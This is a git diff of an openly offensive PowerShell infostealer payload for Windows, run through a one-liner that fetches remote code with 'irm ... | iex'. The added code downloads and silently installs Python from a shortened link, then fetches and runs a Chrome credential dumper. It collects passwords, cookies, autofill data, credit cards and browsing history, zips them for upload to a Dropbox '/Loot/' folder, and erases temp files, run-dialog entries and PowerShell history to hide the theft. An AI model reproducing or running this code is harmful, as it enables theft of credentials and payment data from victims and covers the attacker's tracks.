@@ -18,7 +18,7 @@
 #
 # Created By: 0D1NSS0N
 # Target: Windows 10/11
-# Version: 2.0
+# Version: 2.1
 # How-To: update $db = 'INSERT-YOUR-DROPBOX-TOKEN' then run the payload in powershell
 # payload: $db = 'INSERT-YOUR-DROPBOX-TOKEN';irm tinyurl.com/3tm7msr7 | iex
 # 
@@ -29,29 +29,56 @@
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-# Terminate Google Chrome Process
-try {
-    Write-Host "Terminating Google Chrome process..."
-    Stop-Process -Name "chrome" -Force
-    Write-Host "Google Chrome process terminated successfully."
-}
-catch {
-    Write-Host "Error occurred while terminating Google Chrome process: $_" -ForegroundColor Red
-}
+# Launch Chrome if it hasnt been started
+Start-Process "chrome.exe" -ArgumentList "--start-minimized"
+
 #------------------------------------------------------------------------------------------------------------------------------------
 
-$GLoginPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Login Data"
-$GcookiesPath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
-$GLocalStatePath = "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Local State"
-$GoogleFolderPath = "$env:tmp\Google-UserData\"
-$GfilePath = "$env:temp\Google-UserData.zip"
-$GdestinationPath = "/Loot/$env:USERNAME/Google-UserData.zip"
+$T=$env:tmp
+$U=$env:UserName
+cd $T
+iwr -Uri 'https://t.ly/Ja9JO' -o $T'\py.exe'
+iwr -Uri 'https://raw.githubusercontent.com/netgian/Chrome-Credentials/main/requirements.txt' -o $T'\req.txt'
+iwr -Uri 'https://raw.githubusercontent.com/netgian/Chrome-Credentials/main/chrome.py' -o $T'\chrome.py'
+Start-Process -FilePath $T"\py.exe" -ArgumentList "/S /v/qn" -Wait
+& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\python.exe" -m pip install -r req.txt
+& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\python.exe" chrome.py
 
-mkdir $env:tmp\Google-UserData
+Sleep 5
 
-Copy-Item -Path $GcookiesPath -Destination $GoogleFolderPath -Force
-Copy-Item -Path $GLoginPath -Destination $GoogleFolderPath -Force
-Copy-Item -Path $GLocalStatePath -Destination $GoogleFolderPath -Force
+$GoogleFolderPath = "$env:temp\Chrome-Data"
+$GfilePath = "$env:tmp\Chrome-Data.zip"
+$GdestinationPath = "/Loot/$env:USERNAME/Chrome-Data.zip"
+
+mkdir $env:tmp\Chrome-Data
+
+function Copy-ChromeDataFiles {
+    param(
+        [string]$sourceFolder = "$env:temp",
+        [string]$destinationFolder = $GoogleFolderPath
+    )
+
+    # List of files to copy
+    $files = @("passwords.txt", "cookies.txt", "autofill.txt", "credit_cards.txt", "search_history.txt", "web_history.txt")
+
+    # Copy each file to the destination folder
+    foreach ($file in $files) {
+        $sourcePath = Join-Path -Path $sourceFolder -ChildPath $file
+        $destinationPath = Join-Path -Path $destinationFolder -ChildPath $file
+
+        # Check if the source file exists before copying
+        if (Test-Path -Path $sourcePath -PathType Leaf) {
+            Copy-Item -Path $sourcePath -Destination $destinationPath -Force
+            Write-Host "File $file copied to $destinationFolder"
+        } else {
+            Write-Host "File $file not found in $sourceFolder"
+        }
+    }
+}
+
+# Call the function
+Copy-ChromeDataFiles
+
 Compress-Archive -Path $GoogleFolderPath -DestinationPath $GfilePath
 
 #------------------------------------------------------------------------------------------------------------------------------------
@@ -222,6 +249,7 @@ catch {
 # Clean Exfiltration - deletes files in tmp directory, deletes run dialog and powershell history, empties recycling bin
 # ^^ Thanks for this I-Am-Jakoby ^^
 #
+Taskkill /F /IM chrome.exe
 rm $env:tmp\* -r -Force -ErrorAction SilentlyContinue
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
